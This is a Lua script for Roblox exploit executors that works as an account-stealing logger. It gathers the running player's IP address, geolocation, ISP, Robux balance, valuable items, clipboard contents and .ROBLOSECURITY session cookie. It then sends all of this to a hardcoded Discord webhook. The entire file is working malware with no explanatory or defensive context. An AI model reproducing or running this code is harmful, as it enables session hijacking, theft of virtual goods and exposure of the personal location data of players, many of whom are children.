local request = (syn and syn.request) or (http and http.request) or request
if not request then return end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local userId = player.UserId
local name = player.Name
local age = player.AccountAge .. " days"

local function getFlagEmoji(code)
    code = code:upper()
    if #code ~= 2 then return "" end
    local a = code:byte(1) - 65
    local b = code:byte(2) - 65
    if a < 0 or a > 25 or b < 0 or b > 25 then return "" end
    return utf8.char(0x1F1E6 + a) .. utf8.char(0x1F1E6 + b)
end

local ip = "N/A"
for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.me/ip"} do
    local s,r = pcall(request,{Url=url,Method="GET"})
    if s and r and r.Body then
        ip = r.Body:match("^(%d+%.%d+%.%d+%.%d+)$")
        if ip then break end
    end
end

local geo = {city="?",country="?",isp="?",countryCode="??"}
pcall(function()
    local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp,countryCode",Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d then geo = d end
    end
end)
local flag = getFlagEmoji(geo.countryCode)

local display = name
pcall(function()
    local r = request({Url="https://users.roblox.com/v1/users/"..userId,Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.displayName then display = d.displayName end
    end
end)

local hwid = "N/A"
pcall(function()
    if identifyexecutor then hwid = identifyexecutor()
    elseif getexecutorname then hwid = getexecutorname()
    end
end)

local device = "N/A"
pcall(function()
    device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
end)

local robux = "N/A"
pcall(function()
    local r = request({Url="https://economy.roblox.com/v1/users/"..userId.."/currency",Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.robux then robux = tostring(d.robux) end
    end
end)

local recentGames = "None"
pcall(function()
    local r = request({Url="https://games.roblox.com/v1/users/"..userId.."/games?limit=5&sortOrder=Desc",Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.data and #d.data > 0 then
            local names = {}
            for _,g in ipairs(d.data) do
                table.insert(names, g.name)
            end
            recentGames = table.concat(names, ", ")
        end
    end
end)

local bestGamepass = {name="None", price=0}
pcall(function()
    local r = request({Url="https://inventory.roblox.com/v1/users/"..userId.."/assets?assetType=GamePass&limit=100",Method="GET"})
    if r and r.Body then
        local d = HttpService:JSONDecode(r.Body)
        if d and d.data then
            for _,item in ipairs(d.data) do
                if item.priceInRobux and item.priceInRobux > bestGamepass.price then
                    bestGamepass = {name=item.name or "Unknown", price=item.priceInRobux}
                end
            end
        end
    end
end)

local bestLimited = {name="None",rap=0,value=0}
pcall(function()
    local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
    if r and r.Body then
        local data = HttpService:JSONDecode(r.Body)
        if data and data.items then
            for _,v in pairs(data.items) do
                local price = math.max(v.rap or 0, v.value or 0)
                if price > bestLimited.rap then
                    bestLimited = {name=v.name or "Unknown",rap=v.rap or 0,value=v.value or 0}
                end
            end
        end
    end
end)

local clipboard = "N/A"
pcall(function()
    if getclipboard then clipboard = getclipboard()
    elseif getclipboardtext then clipboard = getclipboardtext()
    end
    if clipboard and #clipboard > 100 then clipboard = clipboard:sub(1,97).. "..." end
end)

local cookie = "N/A"
pcall(function()
    local req = request({Url="https://www.roblox.com/my/settings/json",Method="GET"})
    if req and req.Headers then
        local header = req.Headers["set-cookie"] or req.Headers["Set-Cookie"] or ""
        cookie = header:match("%.ROBLOSECURITY=([^;]+)") or "Found but no match"
    end
end)

local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
local profile = "https://www.roblox.com/users/"..userId.."/profile"
local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")

local embed = {{
    author = {
        name = display .. " (@" .. name .. ")",
        url = profile,
        icon_url = avatar
    },
    title = "View Profile",
    url = profile,
    description =
        "**Account Age:** `"..age.."`\n"..
        "**Robux:** `"..robux.."`\n\n"..
        "**Most Valuable Gamepass:** `"..bestGamepass.name.."` (`"..bestGamepass.price.." R$`)\n"..
        "**Most Valuable Limited:** `"..bestLimited.name.."` (RAP: `"..bestLimited.rap.."` | Value: `"..bestLimited.value.."`)\n\n"..
        "**IP:** `"..ip.."`\n"..
        "**Location:** `"..flag.." "..geo.city..", "..geo.country.."`\n"..
        "**ISP:** `"..geo.isp.."`\n\n"..
        "**HWID:** `"..hwid.."`\n"..
        "**Device:** `"..device.."`\n"..
        "**Clipboard:** `"..clipboard.."`\n\n"..
        "**Recent Games:** `"..recentGames.."`\n\n"..
        "**Cookie:** ||`"..cookie.."`||",
    thumbnail = {url = avatar},
    color = 0x00ff88,
    footer = {text = "Logged • "..os.date("%Y-%m-%d %H:%M:%S")},
    timestamp = isoTime
}}

local payload = {
    username = "Roblox Logger",
    avatar_url = avatar,
    embeds = embed
}

local webhook = "https://discord.com/api/webhooks/1436898097765548032/NhpnCBD_N1jYTSCHSEKRVjTn2IeGfMeJkFTQAqeKzKAmdMjugeOkuUiJjKquwYS_79QY"

pcall(function()
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end)
